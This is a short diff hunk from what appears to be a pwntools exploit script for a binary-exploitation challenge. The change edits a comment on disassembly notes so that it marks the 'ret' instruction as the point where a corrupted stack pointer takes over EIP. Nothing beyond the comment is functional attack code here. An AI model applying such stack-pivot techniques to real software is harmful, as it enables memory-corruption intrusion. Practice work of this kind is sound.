@@ -16,7 +16,7 @@ r.sendline(b'1')
 # setting ESP 
 # 0x080488ee <+798>:	leave  
 # 0x080488ef <+799>:	lea    esp,[ecx-0x4]
-# 0x080488f2 <+802>:	ret 
+# 0x080488f2 <+802>:	ret <--- ESP to EIP
 
 for i in range(4):
     r.recvuntil(b'exit\n')
